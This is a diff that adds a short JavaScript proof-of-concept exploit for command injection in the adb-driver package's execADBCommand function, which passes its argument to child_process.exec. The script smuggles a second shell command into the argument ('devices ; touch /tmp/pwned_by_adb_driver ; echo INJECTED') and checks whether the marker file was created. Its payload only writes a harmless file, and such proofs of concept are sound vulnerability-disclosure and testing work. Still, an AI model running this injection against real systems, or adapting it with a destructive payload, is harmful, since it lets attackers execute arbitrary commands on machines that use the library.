@@ -1,0 +1,16 @@
+```javascript
+// Exploit for command injection in adb-driver's execADBCommand (build/AdbDriver.js),
+// which builds the ADB binary path via `binFile` and blindly shells out with
+// child_process.exec(). Since the "command" argument is naively split on spaces
+// and re-joined, shell metacharacters (e.g. `;`) let an attacker run arbitrary
+// OS commands alongside the intended adb invocation.
+
+const { execADBCommand } = require("adb-driver");
+
+const maliciousCommand = 'devices ; touch /tmp/pwned_by_adb_driver ; echo INJECTED';
+
+execADBCommand(maliciousCommand).then((out) => {
+    console.log("Command output:\n", out);
+    console.log("Injected command ran:", require("fs").existsSync("/tmp/pwned_by_adb_driver"));
+});
+```
